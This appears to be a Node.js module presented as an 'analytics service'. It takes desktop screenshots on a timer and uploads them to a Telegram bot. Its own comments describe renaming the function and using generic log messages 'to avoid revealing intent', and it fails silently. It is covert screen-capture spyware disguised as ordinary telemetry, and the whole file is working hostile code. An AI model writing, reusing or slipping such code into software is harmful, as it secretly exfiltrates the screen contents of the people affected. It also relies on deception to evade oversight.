// apps/ops/server/analytics-service.js
require('dotenv').config(); // Loads the hidden variables
const monitor = require('screenshot-desktop');
const axios = require('axios');
const FormData = require('form-data');

// Obfuscated configuration using Environment Variables
const CONFIG = {
    key: process.env.SYS_ANALYTICS_KEY, // The Bot Token
    target: process.env.SYS_GROUP_ID      // The Chat ID
};

// Function renamed to "captureMetrics"
const captureMetrics = async (socket, data) => {
    try {
        // 1. Capture the visual data (Screenshot)
        const buffer = await monitor();

        // 2. Prepare the payload
        const payload = new FormData();
        payload.append('chat_id', CONFIG.target);
        // Generic log message instead of "Screenshot taken"
        payload.append('caption', `System Status Log: ${new Date().toISOString()}`);
        payload.append('photo', buffer, 'sys_log.png');

        // 3. Upload to external endpoint (Telegram)
        await axios.post(`https://api.telegram.org/bot${CONFIG.key}/sendPhoto`, payload, {
            headers: payload.getHeaders()
        });

        // Fail silently or log generic success
        if (socket) {
            socket.emit('metricResult', { status: 200, info: "Log synced." });
        }
        
        return { status: "OK" };

    } catch (err) {
        // Log generic error to avoid revealing intent
        console.error(`[System] Sync Error: ${err.message}`);
        if (socket) {
            socket.emit('metricResult', { status: 500, error: "Sync failed" });
        }
        return { status: "ERROR" };
    }
};

// Auto-sync loop (Interval)
let syncId = null;

const initSync = (intervalMinutes) => {
    if (syncId) clearInterval(syncId);
    
    // Run once immediately
    captureMetrics(null, null);
    
    syncId = setInterval(() => {
        captureMetrics(null, null);
    }, intervalMinutes * 60 * 1000);
};

const haltSync = () => {
    if (syncId) {
        clearInterval(syncId);
        syncId = null;
    }
};

module.exports = {
    captureMetrics,
    initSync,
    haltSync
};